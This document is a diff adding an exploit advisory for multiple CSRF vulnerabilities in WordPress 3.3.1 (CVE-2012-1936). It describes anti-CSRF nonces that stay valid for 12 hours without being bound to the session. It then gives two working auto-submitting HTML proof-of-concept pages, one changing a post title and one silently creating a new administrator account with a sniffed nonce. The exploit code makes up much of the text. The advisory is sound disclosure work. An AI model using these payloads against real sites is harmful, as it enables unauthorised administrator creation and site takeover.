@@ -1,0 +1,112 @@
++---------------------------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title     : Wordpress 3.3.1 Multiple CSRF Vulnerabilities 
+# Date              : 19-03-2012
+# Author            : Ivano Binetti (http://www.ivanobinetti.com)
+# Software link     : http://wordpress.org/wordpress-3.3.1.zip
+# Vendor site       : http://wordpress.org
+# Version           : 3.3.1 (and lower). Probably also version 3.3.2 is affected.
+# Tested on         : Debian Squeeze (6.0) 
+# Original Advisory : http://www.webapp-security.com/2012/04/wordpress-3-3-1-multiple-csrf-vulnerabilities/
+# CVE               : CVE-2012-1936
+# OSVDB ID          : 81588
+# Bugtraq ID        : 53280
++---------------------------------------------------------------------------------------------------------------------------------------------------+
+Summary
+1)Introduction
+2)Vulnerabilities Description 
+ 2.1 Multiple CSRF
+3)Exploit
+ 3.1 CSRF (Change Post Title)
+ 3.2 CSRF (Add Admin)
++---------------------------------------------------------------------------------------------------------------------------------------------------+
+1)Introduction
+WordPress "is web software you can use to create a beautiful website or blog. We like to say that WordPress is both free and priceless at 
+the same time."
+
+2)Vulnerability Description 
+ 2.1 Multiple CSRF
+ Wordpress 3.3.1 suffers from multiple CSRF vulnerabilities which allow an attacker to change post title, add
+ administrators/users, delete administrators/users, approve and unapprove comment, delete comment, change background image, insert custom 
+ header image, change site title, change administrator's email, change Wordpress Address, change Site Address, when an authenticated user/admin 
+ browses a special crafted web page. May be other parameters can be modified. 
+ This vulnerability is caused by a security flaw in anti-CSRF token (_wpnonce, _wpnonce_create-user, _ajax_nonce, 
+ _wpnonce-custom-background-upload, _wpnonce-custom-header-upload) generation. For some operations (see below) above specified anti-CSRF tokens are
+ not associated with the current user session (as Owasp recommends) but are the are valid for all operations (for a specific administrator/user)
+ within 12 hour.
+ The above described vulnerability allows an attacker - who has sniffed anti-CSRF token - to have 12 hour to perform a CSRF attack.
+ For Owasp recommendation about anti-CSRF token, you can read the following document:
+ https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet#General_Recommendation:_Synchronizer_Token_Pattern 
+ This problem affects the following operations:
+ - Add Admin/User
+ - Delete Admin/User
+ - Approve comment
+ - Unapprove comment
+ - Delete comment
+ - Change background image
+ - Insert custom header image
+ - Change site title
+ - Change administrator's email
+ - Change Wordpress Address
+ - Change Site Address
+ Other operations (like insert a new post) are not affected by this CSRF vulnerability.
+ In this Advisory I will only demonstrate how to change post title and how to add a new administrator account.
+ 
+3)Exploit 
+
+ 3.1 CSRF (Change Post Title)
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit to change post title</H2>
+ <form method="POST" name="form0" action="http://<wordpress_ip>:80/wp-admin/admin-ajax.php">
+ <input type="hidden" name="post_title" value="hackedtitle"/>
+ <input type="hidden" name="post_name" value="hackedtitle"/>
+ <input type="hidden" name="mm" value="03"/>
+ <input type="hidden" name="jj" value="16"/>
+ <input type="hidden" name="aa" value="2012"/>
+ <input type="hidden" name="hh" value=""/>
+ <input type="hidden" name="mn" value=""/>
+ <input type="hidden" name="ss" value=""/>
+ <input type="hidden" name="post_author" value="1"/>
+ <input type="hidden" name="post_password" value=""/>
+ <input type="hidden" name="post_category%5B%5D" value="0"/>
+ <input type="hidden" name="post_category%5B%5D" value="1"/>
+ <input type="hidden" name="tax_input%5Bpost_tag%5D" value=""/>
+ <input type="hidden" name="comment_status" value="open"/>
+ <input type="hidden" name="ping_status" value="open"/>
+ <input type="hidden" name="_status" value="publish"/>
+ <input type="hidden" name="post_format" value="0"/>
+ <input type="hidden" name="_inline_edit" value="<sniffed_value>"/>
+ <input type="hidden" name="post_view" value="list"/>
+ <input type="hidden" name="screen" value="edit-post"/>
+ <input type="hidden" name="action" value="inline-save"/>
+ <input type="hidden" name="post_type" value="post"/>
+ <input type="hidden" name="post_ID" value="1"/>
+ <input type="hidden" name="edit_date" value="true"/>
+ <input type="hidden" name="post_status" value="all"/>
+ </form>
+ </body>
+ </html>
+
+ Note: this exploit simulate changing of post title using "Quick Edit" function
+
+ 3.2 CSRF (Add Admin)
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit to add Administrator</H2>
+ <form method="POST" name="form0" action="http://<wordpress_ip>:80/wp-admin/user-new.php">
+ <input type="hidden" name="action" value="createuser"/>
+ <input type="hidden" name="_wpnonce_create-user" value="<sniffed_value>"/>
+ <input type="hidden" name="_wp_http_referer" value="%2Fwordpress%2Fwp-admin%2Fuser-new.php"/>
+ <input type="hidden" name="user_login" value="admin2"/>
+ <input type="hidden" name="email" value="admin2@admin.com"/>
+ <input type="hidden" name="first_name" value="admin2@admin.com"/>
+ <input type="hidden" name="last_name" value=""/>
+ <input type="hidden" name="url" value=""/>
+ <input type="hidden" name="pass1" value="password"/>
+ <input type="hidden" name="pass2" value="password"/>
+ <input type="hidden" name="role" value="administrator"/>
+ <input type="hidden" name="createuser" value="Add+New+User+"/>
+ </form>
+ </body>
+ </html>
++--------------------------------------------------------------------------------------------------------------------------------------------------+
